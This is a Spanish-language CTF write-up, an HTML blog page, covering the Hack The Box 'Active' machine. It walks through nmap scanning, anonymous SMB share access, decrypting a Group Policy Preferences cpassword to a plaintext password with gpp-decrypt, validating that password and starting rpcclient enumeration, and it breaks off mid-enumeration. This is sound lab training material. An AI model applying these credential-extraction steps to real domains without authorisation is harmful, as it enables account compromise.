@@ -1,0 +1,787 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>            Hack The Box Active - K4miyo      Ciberseguridad!      </title>
+<meta name="description" content="Resolución de la máquina Active en la plataforma de Hack The Box">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="K4miyo | Ciberseguridad!">
+<meta property="og:title" content="Hack The Box Active">
+<meta property="og:url" content="http://localhost:4000/htb-active/">
+
+
+  <meta property="og:description" content="Resolución de la máquina Active en la plataforma de Hack The Box">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-active/active.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2021-12-05T00:00:00-06:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-active/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "K4miyo",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="K4miyo | Ciberseguridad! Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Artículos</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categorías</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Etiquetas</a>
+            </li><li class="masthead__menu-item">
+              <a href="/buscador/" >Buscador</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >Contacto</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Hack The Box Active</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="K4miyo" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">K4miyo</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Cyber Threat Intelligence Analyst
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/k4miyo" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Hack The Box Active">
+    <meta itemprop="description" content="Resolución de la máquina Active en la plataforma de Hack The Box">
+    <meta itemprop="datePublished" content="December 05, 2021">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Hack The Box Active
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2021-12-05T00:00:00-06:00">December 05, 2021 </time>&emsp;
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-active/banner-active.jpg" alt="" /></p>
+
+<h2 id="active">Active</h2>
+<p>Se procede con la fase de reconocimiento lanzando primeramente un <code class="language-plaintext highlighter-rouge">ping</code> a la dirección IP 10.10.10.100.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.100
+PING 10.10.10.100 <span class="o">(</span>10.10.10.100<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 10.10.10.100: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>127 <span class="nb">time</span><span class="o">=</span>136 ms
+
+<span class="nt">---</span> 10.10.10.100 ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 136.281/136.281/136.281/0.000 ms
+</code></pre></div></div>
+
+<p>De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de <code class="language-plaintext highlighter-rouge">nmap</code> para determinar los puertos abiertos de la máquina y exportanto la información al archivo <strong>allPorts</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.100 <span class="nt">-oG</span> allPorts
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>may be slower.
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-11-28 22:17 CST
+Initiating SYN Stealth Scan at 22:17         
+Scanning 10.10.10.100 <span class="o">[</span>65535 ports]        
+Discovered open port 445/tcp on 10.10.10.100  
+Discovered open port 139/tcp on 10.10.10.100  
+Discovered open port 135/tcp on 10.10.10.100  
+Discovered open port 53/tcp on 10.10.10.100 
+Discovered open port 5722/tcp on 10.10.10.100
+Discovered open port 464/tcp on 10.10.10.100  
+Discovered open port 49155/tcp on 10.10.10.100
+Discovered open port 49182/tcp on 10.10.10.100
+Discovered open port 49158/tcp on 10.10.10.100                                                                                   
+Discovered open port 49169/tcp on 10.10.10.100
+Discovered open port 636/tcp on 10.10.10.100  
+Discovered open port 49157/tcp on 10.10.10.100
+Discovered open port 9389/tcp on 10.10.10.100                                                                                    
+Discovered open port 88/tcp on 10.10.10.100                                                                                      
+Discovered open port 49152/tcp on 10.10.10.100
+Discovered open port 49154/tcp on 10.10.10.100  
+Discovered open port 49153/tcp on 10.10.10.100  
+Discovered open port 389/tcp on 10.10.10.100    
+Discovered open port 3269/tcp on 10.10.10.100   
+Discovered open port 49171/tcp on 10.10.10.100  
+Discovered open port 3268/tcp on 10.10.10.100   
+Discovered open port 593/tcp on 10.10.10.100    
+Completed SYN Stealth Scan at 22:18, 14.26s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.10.10.100               
+Host is up, received user-set <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>  
+Scanned at 2021-11-28 22:17:47 CST <span class="k">for </span>15s      
+Not shown: 65477 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>, 36 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
+PORT      STATE SERVICE          REASON
+53/tcp    open  domain           syn-ack ttl 127
+88/tcp    open  kerberos-sec     syn-ack ttl 127
+135/tcp   open  msrpc            syn-ack ttl 127
+139/tcp   open  netbios-ssn      syn-ack ttl 127
+389/tcp   open  ldap             syn-ack ttl 127
+445/tcp   open  microsoft-ds     syn-ack ttl 127
+464/tcp   open  kpasswd5         syn-ack ttl 127
+593/tcp   open  http-rpc-epmap   syn-ack ttl 127
+636/tcp   open  ldapssl          syn-ack ttl 127
+3268/tcp  open  globalcatLDAP    syn-ack ttl 127
+3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
+5722/tcp  open  msdfsr           syn-ack ttl 127
+9389/tcp  open  adws             syn-ack ttl 127
+49152/tcp open  unknown          syn-ack ttl 127
+49153/tcp open  unknown          syn-ack ttl 127
+49154/tcp open  unknown          syn-ack ttl 127
+49155/tcp open  unknown          syn-ack ttl 127
+49157/tcp open  unknown          syn-ack ttl 127
+49158/tcp open  unknown          syn-ack ttl 127
+49169/tcp open  unknown          syn-ack ttl 127
+49171/tcp open  unknown          syn-ack ttl 127
+49182/tcp open  unknown          syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>14.36 seconds
+           Raw packets sent: 69987 <span class="o">(</span>3.079MB<span class="o">)</span> | Rcvd: 68046 <span class="o">(</span>2.722MB<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Mediante la función <a href="/extractPorts">extractPorts</a> definida a nivel de <code class="language-plaintext highlighter-rouge">zsh</code> , se obtiene la información más relevante de la captura grepeable.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ extractPorts allPorts
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 
+   2   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
+   3   │ 
+   4   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.10.10.100
+   5   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,49152,49153,49154,49155,49157,49158,49169,4917
+       │ 1,49182
+   6   │ 
+   7   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
+</code></pre></div></div>
+
+<p>A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p53</span>,88,135,139,389,445,464,593,636,3268,3269,5722,9389,49152,49153,49154,49155,49157,49158,49169,49171,49182 10.10.10.100 <span class="nt">-oN</span> targeted
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-11-28 22:22 CST
+Nmap scan report <span class="k">for </span>10.10.10.100
+Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Microsoft DNS 6.1.7601 <span class="o">(</span>1DB15D39<span class="o">)</span> <span class="o">(</span>Windows Server 2008 R2 SP1<span class="o">)</span>
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 <span class="o">(</span>1DB15D39<span class="o">)</span>
+88/tcp    open  tcpwrapped
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: active.htb, Site: Default-First-Site-Name<span class="o">)</span>
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: active.htb, Site: Default-First-Site-Name<span class="o">)</span>
+3269/tcp  open  tcpwrapped
+5722/tcp  open  msrpc         Microsoft Windows RPC
+9389/tcp  open  mc-nmf        .NET Message Framing
+49152/tcp open  msrpc         Microsoft Windows RPC
+49153/tcp open  msrpc         Microsoft Windows RPC
+49154/tcp open  msrpc         Microsoft Windows RPC
+49155/tcp open  msrpc         Microsoft Windows RPC
+49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  msrpc         Microsoft Windows RPC
+49169/tcp open  msrpc         Microsoft Windows RPC
+49171/tcp open  msrpc         Microsoft Windows RPC
+49182/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 4m57s
+| smb2-security-mode: 
+|   2.1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   <span class="nb">date</span>: 2021-11-29T04:28:39
+|_  start_date: 2021-11-29T04:26:46
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>74.86 seconds
+</code></pre></div></div>
+
+<p>Tenemos abierto el puerto 445, por lo que podríamos tratar de ver recursos con una <em>Null session</em>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient <span class="nt">-L</span> 10.10.10.100 <span class="nt">-N</span>
+Anonymous login successful
+
+        Sharename       Type      Comment
+        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+        ADMIN<span class="nv">$ </span>         Disk      Remote Admin
+        C<span class="nv">$ </span>             Disk      Default share
+        IPC<span class="nv">$ </span>           IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        Replication     Disk      
+        SYSVOL          Disk      Logon server share 
+        Users           Disk      
+SMB1 disabled <span class="nt">--</span> no workgroup available
+❯ smbmap <span class="nt">-H</span> 10.10.10.100
+<span class="o">[</span>+] IP: 10.10.10.100:445        Name: 10.10.10.100                                      
+        Disk                                                    Permissions     Comment
+        <span class="nt">----</span>                                                    <span class="nt">-----------</span>     <span class="nt">-------</span>
+        ADMIN<span class="nv">$ </span>                                                 NO ACCESS       Remote Admin
+        C<span class="nv">$ </span>                                                     NO ACCESS       Default share
+        IPC<span class="nv">$ </span>                                                   NO ACCESS       Remote IPC
+        NETLOGON                                                NO ACCESS       Logon server share 
+        Replication                                             READ ONLY
+        SYSVOL                                                  NO ACCESS       Logon server share 
+        Users                                                   NO ACCESS
+
+</code></pre></div></div>
+
+<p>Observamos que tenemos permisos de lectura bajo el recurso <code class="language-plaintext highlighter-rouge">Replication</code>, así que vamos a echarle un ojo. Como vemos que cuenta con múltiples directorios internos uno dentro de otro, mejor vamos descargarlos a nuestro equipo de atacante (<strong>Nota</strong>: En este caso se descargan debido a que son relativamente pocos, en caso de que sean muchos, es recomendable crear una mountura).</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient //10.10.10.100/Replication <span class="nt">-N</span>
+Anonymous login successful
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> 
+smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
+  <span class="nb">.</span>                                   D        0  Sat Jul 21 05:37:44 2018
+  ..                                  D        0  Sat Jul 21 05:37:44 2018
+  active.htb                          D        0  Sat Jul 21 05:37:44 2018
+
+                10459647 blocks of size 4096. 5728098 blocks available
+smb: <span class="se">\&gt;</span> recurse ON
+smb: <span class="se">\&gt;</span> prompt OFF
+smb: <span class="se">\&gt;</span> mget <span class="k">*</span>
+getting file <span class="se">\a</span>ctive.htb<span class="se">\P</span>olicies<span class="se">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span><span class="se">\G</span>PT.INI of size 23 as active.htb/Policies/<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>/GPT.INI <span class="o">(</span>0.0 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.0 KiloBytes/sec<span class="o">)</span>
+getting file <span class="se">\a</span>ctive.htb<span class="se">\P</span>olicies<span class="se">\{</span>6AC1786C-016F-11D2-945F-00C04fB984F9<span class="o">}</span><span class="se">\G</span>PT.INI of size 22 as active.htb/Policies/<span class="o">{</span>6AC1786C-016F-11D2-945F-00C04fB984F9<span class="o">}</span>/GPT.INI <span class="o">(</span>0.0 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.0 KiloBytes/sec<span class="o">)</span>
+getting file <span class="se">\a</span>ctive.htb<span class="se">\P</span>olicies<span class="se">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span><span class="se">\G</span>roup Policy<span class="se">\G</span>PE.INI of size 119 as active.htb/Policies/<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>/Group Policy/GPE.INI <span class="o">(</span>0.2 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.1 KiloBytes/sec<span class="o">)</span>
+getting file <span class="se">\a</span>ctive.htb<span class="se">\P</span>olicies<span class="se">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span><span class="se">\M</span>ACHINE<span class="se">\R</span>egistry.pol of size 2788 as active.htb/Policies/<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>/MACHINE/Registry.pol <span class="o">(</span>5.0 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 1.3 KiloBytes/sec<span class="o">)</span>
+getting file <span class="se">\a</span>ctive.htb<span class="se">\P</span>olicies<span class="se">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span><span class="se">\M</span>ACHINE<span class="se">\P</span>references<span class="se">\G</span>roups<span class="se">\G</span>roups.xml of size 533 as active.htb/Policies/<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>/MACHINE/Preferences/Groups/Groups.xml <span class="o">(</span>1.0 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 1.3 KiloBytes/sec<span class="o">)</span>
+getting file <span class="se">\a</span>ctive.htb<span class="se">\P</span>olicies<span class="se">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span><span class="se">\M</span>ACHINE<span class="se">\M</span>icrosoft<span class="se">\W</span>indows NT<span class="se">\S</span>ecEdit<span class="se">\G</span>ptTmpl.inf of size 1098 as active.htb/Policies/<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf <span class="o">(</span>2.0 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 1.4 KiloBytes/sec<span class="o">)</span>
+getting file <span class="se">\a</span>ctive.htb<span class="se">\P</span>olicies<span class="se">\{</span>6AC1786C-016F-11D2-945F-00C04fB984F9<span class="o">}</span><span class="se">\M</span>ACHINE<span class="se">\M</span>icrosoft<span class="se">\W</span>indows NT<span class="se">\S</span>ecEdit<span class="se">\G</span>ptTmpl.inf of size 3722 as active.htb/Policies/<span class="o">{</span>6AC1786C-016F-11D2-945F-00C04fB984F9<span class="o">}</span>/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf <span class="o">(</span>6.7 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 2.1 KiloBytes/sec<span class="o">)</span>
+smb: <span class="se">\&gt;</span>
+</code></pre></div></div>
+
+<p>Una vez que nos hayamos descargado los recursos a nuestra máquina de atacante, vamos a echarles un ojo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ tree
+<span class="nb">.</span>
+└── active.htb
+    ├── DfsrPrivate
+    │   ├── ConflictAndDeleted
+    │   ├── Deleted
+    │   └── Installing
+    ├── Policies
+    │   ├── <span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>
+    │   │   ├── GPT.INI
+    │   │   ├── Group Policy
+    │   │   │   └── GPE.INI
+    │   │   ├── MACHINE
+    │   │   │   ├── Microsoft
+    │   │   │   │   └── Windows NT
+    │   │   │   │       └── SecEdit
+    │   │   │   │           └── GptTmpl.inf
+    │   │   │   ├── Preferences
+    │   │   │   │   └── Groups
+    │   │   │   │       └── Groups.xml
+    │   │   │   └── Registry.pol
+    │   │   └── USER
+    │   └── <span class="o">{</span>6AC1786C-016F-11D2-945F-00C04fB984F9<span class="o">}</span>
+    │       ├── GPT.INI
+    │       ├── MACHINE
+    │       │   └── Microsoft
+    │       │       └── Windows NT
+    │       │           └── SecEdit
+    │       │               └── GptTmpl.inf
+    │       └── USER
+    └── scripts
+
+22 directories, 7 files
+</code></pre></div></div>
+
+<p>Dentro de lo observamos, tenemos un recurso interesante en el cual podríamos encontrar credenciales <code class="language-plaintext highlighter-rouge">Groups.xml</code> asociado al SYSVOL. SYSVOL es el recurso compartido de todo el dominio en Active Directory al que todos los usuarios autenticados tienen acceso de lectura. SYSVOL contiene scripts de inicio de sesión, datos de políticas de grupo y otros datos de todo el dominio que deben estar disponibles en cualquier lugar donde haya un controlador de dominio (ya que SYSVOL se sincroniza y comparte automáticamente entre todos los controladores de dominio). Para mayor información, podríamos consultar el siguiente recurso: <a href="https://adsecurity.org/?p=2288">adsecurity</a>.</p>
+
+<p>Vamos a tratar de visualizar el contenido de dicho archivo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>active.htb/Policies/<span class="se">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="se">\}</span>/MACHINE/Preferences/Groups/Groups.xml
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: active.htb/Policies/<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>/MACHINE/Preferences/Groups/Groups.xml
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ &lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"utf-8"</span>?&gt;
+   2   │ &lt;Groups <span class="nv">clsid</span><span class="o">=</span><span class="s2">"{3125E937-EB16-4b4c-9934-544FC6D24D26}"</span><span class="o">&gt;</span>&lt;User <span class="nv">clsid</span><span class="o">=</span><span class="s2">"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"active
+       │ .htb</span><span class="se">\S</span><span class="s2">VC_TGS"</span> <span class="nv">image</span><span class="o">=</span><span class="s2">"2"</span> <span class="nv">changed</span><span class="o">=</span><span class="s2">"2018-07-18 20:46:06"</span> <span class="nv">uid</span><span class="o">=</span><span class="s2">"{EF57DA28-5F69-4530-A59E-AAB58578219D}"</span><span class="o">&gt;</span>&lt;Properties <span class="nv">action</span><span class="o">=</span><span class="s2">"U
+       │ "</span> <span class="nv">newName</span><span class="o">=</span><span class="s2">""</span> <span class="nv">fullName</span><span class="o">=</span><span class="s2">""</span> <span class="nv">description</span><span class="o">=</span><span class="s2">""</span> <span class="nv">cpassword</span><span class="o">=</span><span class="s2">"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8
+       │ pG5aSVYdYw/NglVmQ"</span> <span class="nv">changeLogon</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">noChange</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">neverExpires</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">acctDisabled</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">userName</span><span class="o">=</span><span class="s2">"active.htb</span><span class="se">\S</span><span class="s2">VC_TGS"</span>/&gt;&lt;/User&gt;
+   3   │ &lt;/Groups&gt;
+───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</code></pre></div></div>
+
+<p>Vamos a filtrar por la información que nos interesa, que es el campo <code class="language-plaintext highlighter-rouge">cpassword</code> y <code class="language-plaintext highlighter-rouge">userName</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>active.htb/Policies/<span class="se">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="se">\}</span>/MACHINE/Preferences/Groups/Groups.xml | <span class="nb">grep</span> <span class="nt">-o</span> <span class="s1">'cpassword="[^"]\+"\|userName="[^"]\+"'</span>
+<span class="nv">cpassword</span><span class="o">=</span><span class="s2">"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"</span>
+<span class="nv">userName</span><span class="o">=</span><span class="s2">"active.htb</span><span class="se">\S</span><span class="s2">VC_TGS"</span>
+</code></pre></div></div>
+
+<p>Con la utilidad <code class="language-plaintext highlighter-rouge">gpp-decrypt</code> podemos obtener la contraseña en texto claro, en este caso para el usuario <code class="language-plaintext highlighter-rouge">active.htb\SVC_TGS</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+GPPstillStandingStrong2k18
+</code></pre></div></div>
+
+<p>Como siempre, guardamos las credenciales que identifiquemos y vamos a validarlas:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.100 <span class="nt">-u</span> <span class="s1">'SVC_TGS'</span> <span class="nt">-p</span> <span class="s1">'GPPstillStandingStrong2k18'</span>
+SMB         10.10.10.100    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:active.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.100    445    DC               <span class="o">[</span>+] 
+active.htb<span class="se">\S</span>VC_TGS:GPPstillStandingStrong2k18
+❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-u</span> <span class="s1">'SVC_TGS'</span> <span class="nt">-p</span> <span class="s1">'GPPstillStandingStrong2k18'</span>
+<span class="o">[</span>+] IP: 10.10.10.100:445        Name: 10.10.10.100                                      
+        Disk                                                    Permissions     Comment
+        <span class="nt">----</span>                                                    <span class="nt">-----------</span>     <span class="nt">-------</span>
+        ADMIN<span class="nv">$ </span>                                                 NO ACCESS       Remote Admin
+        C<span class="nv">$ </span>                                                     NO ACCESS       Default share
+        IPC<span class="nv">$ </span>                                                   NO ACCESS       Remote IPC
+        NETLOGON                                                READ ONLY       Logon server share 
+        Replication                                             READ ONLY
+        SYSVOL                                                  READ ONLY       Logon server share 
+        Users                                                   READ ONLY
+
+</code></pre></div></div>
+
+<p>Vemos que las credenciales son válidas y ahora tenemos permisos de lectura sobre varios recursos que antes no podíamos del servicio SMB. Ahora podríamos tratar de conectarnos a través de <code class="language-plaintext highlighter-rouge">rpcclient</code> para obtener información sobre el dominio:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rpcclient <span class="nt">-U</span> <span class="s2">"SVC_TGS"</span> 10.10.10.100
+Enter WORKGROUP<span class="se">\S</span>VC_TGS<span class="s1">'s password: 
+rpcclient $&gt; enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[SVC_TGS] rid:[0x44f]
+rpcclient $&gt; enumdomgroups
+group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
